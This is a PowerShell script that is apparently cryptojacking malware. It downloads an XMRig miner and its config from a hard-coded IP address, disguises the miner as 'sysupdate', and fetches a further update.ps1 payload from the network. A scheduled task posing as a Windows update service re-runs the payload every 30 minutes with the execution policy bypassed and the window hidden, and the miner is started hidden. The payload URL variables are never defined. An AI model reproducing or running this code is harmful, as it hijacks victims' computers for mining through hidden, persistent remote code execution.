$ne = $MyInvocation.MyCommand.Path
$miner_url = "http://185.246.90.205/xmrig.exe"
$miner_url_backup = "http://185.246.90.205/xmrig.exe"
$miner_size = 4578304
$miner_name = "sysupdate"
$miner_cfg_url = "http://185.246.90.205/config.json"
$miner_cfg_url_backup = "http://185.246.90.205/config.json"
$miner_cfg_size = 3714
$miner_cfg_name = "config.json"


$miner_path = "$env:TMP\sysupdate.exe"
$miner_cfg_path = "$env:TMP\config.json"
$payload_path = "$env:TMP\update.ps1"

function Update($url,$backup_url,$path,$proc_name)
 {
    Get-Process -Name $proc_name | Stop-Process
    Remove-Item $path
    Try {
        $vc = New-Object System.Net.WebClient
        $vc.DownloadFile($url,$path)
    }
    Catch {
        Write-Output "donwload with backurl"
        $vc = New-Object System.Net.WebClient
        $vc.DownloadFile($backup_url,$path)
    }
}

#miner_path
if((Test-Path $miner_path))
{
    Write-Output "miner file exist"
    if((Get-Item $miner_path).length -ne $miner_size)
    {
        Update $miner_url $miner_url_backup $miner_path $miner_name
    }
}
else {
    Update $miner_url $miner_url_backup $miner_path $miner_name
}
#miner_cfg_path
if((Test-Path $miner_cfg_path))
{
    Write-Output "miner_cfg file exist"
    if((Get-Item $miner_cfg_path).length -ne $miner_cfg_size)
    {
        Update $miner_cfg_url $miner_cfg_url_backup $miner_cfg_path $miner_cfg_name
    }
}
else {
    Update $miner_cfg_url $miner_cfg_url_backup $miner_cfg_path $miner_cfg_name
}

Remove-Item $payload_path
Remove-Item $HOME\update.ps1
Try {
    $vc = New-Object System.Net.WebClient
    $vc.DownloadFile($payload_url,$payload_path)
}
Catch {
    Write-Output "download with backurl"
    $vc = New-Object System.Net.WebClient
    $vc.DownloadFile($payload_url_backup,$payload_path)
}
echo F | xcopy /y $payload_path $HOME\update.ps1

SchTasks.exe /Create /SC MINUTE /TN "Update service for Windows Service" /TR "PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -File $HOME\update.ps1" /MO 30 /F
if(!(Get-Process $miner_name -ErrorAction SilentlyContinue))
{
    Write-Output "Miner Not running"
	Start-Process $miner_path -windowstyle hidden
}
else
{
	Write-Output "Miner Running"
}

Start-Sleep 5
